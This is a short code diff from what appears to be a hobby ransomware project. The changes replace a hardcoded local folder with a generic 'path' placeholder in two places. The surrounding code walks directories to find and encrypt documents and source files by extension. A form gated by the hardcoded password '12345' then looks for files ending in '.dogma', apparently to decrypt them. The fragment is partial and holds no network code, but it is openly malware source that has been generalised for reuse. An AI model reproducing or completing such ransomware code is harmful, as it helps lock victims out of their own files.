@@ -19,7 +19,7 @@ password = "12345"
 
 
 def encrypt():
-    for root_path, dirs, files in os.walk("/home/golcatlman/PycharmProjects/RansomeWare/Encrypted_Data/"):
+    for root_path, dirs, files in os.walk("path"):
         for file in files:
             if file.endswith((".txt", ".py", ".docx", ".csv")):  # The arg can be a tuple of suffixes to look for
                 unique_file = os.path.join(file)
@@ -185,8 +185,7 @@ class Form:
         if self.user_input == "12345":
 
             try:
-                for root_path, dirs, files in os.walk("/home/golcatlman/PycharmProjects/"
-                                                 "RansomeWare/Encrypted_Data/"):
+                for root_path, dirs, files in os.walk("path"):
                     for file in files:
                         if file.endswith(".dogma"):  # The arg can be a tuple of suffixes to look for
 
